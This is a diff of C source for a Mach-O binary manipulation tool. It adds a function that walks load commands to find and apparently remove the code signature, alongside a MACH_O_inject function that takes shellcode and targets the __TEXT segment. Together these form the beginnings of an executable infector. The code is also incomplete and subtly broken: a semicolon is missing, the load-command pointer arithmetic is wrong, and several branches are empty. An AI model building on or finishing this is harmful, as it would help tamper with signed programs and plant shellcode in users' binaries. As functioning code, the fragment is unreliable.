@@ -1,18 +1,44 @@
 #include "macho.h"
-/*int MACH_O_sig_remove(char *file){
-int i;
+int MACH_O_sig_remove(char *file){
+int i,j;
 unsigned long long size;
 uint32_t magic;
+uint32_t offset;
+uint32_t removed;
 char *mach_o = load_file(file, &size)
+load_command *load;
+uint32_t cmdsize;
 memcpy(&magic,mach_o,sizeof(uint32_t));
 if(magic==0xFEEDFACE){
-   mach_header *hdr32
+   mach_header *mach_hdr32 = (mach_header*)mach_o;
+   load = (load_command*) (mach_o + sizeof(mach_header));
+   for (i = 0; i < mach_hdr32->ncmds; i++){
+    if(load->cmd == LC_CODE_SIGNATURE){
+    removed = load->cmdsize;
+    offset = load->offset;
+    }
+    if(load->cmd == LC_SEGMENT){
+
+    }
+
+   load = (load_command*)(load + load->cmdsize);
+}
 }
 if(magic==0xFEEDFACF){
+   mach_header_64 *mach_hdr64 = (mach_header_64*)mach_o;
+   load = (load_command *) (mach_o + sizeof(mach_header_64));
+   for (i = 0; i < mach_hdr64->ncmds; i++){
+    if (load->cmd == LC_CODE_SIGNATURE){
 
+    }
+    if(load->cmd == LC_SEGMENT_64){
+
+    }
+   load = (load_command *)(load +load->cmdsize);
+}
 
 }
-}*/
+}
 int MACH_O_inject(char *file,char *shellcode,int shellcode_len){
 int i;
 uint32_t size;
@@ -31,7 +57,7 @@ segment_command *text_seg32;
 section *sec32;
 load = (load_command*) (mach_o + sizeof(mach_header));
 for( i = 0 ; i < mach_hdr32->ncmds ; i++){
-if(load->cmd ==LC_SEGMENT){
+if(load->cmd == LC_SEGMENT){
 seg32 = (segment_command*) load;
 if(strcmp(seg32->segname,"__TEXT")==0){
     text_seg32 = seg32;
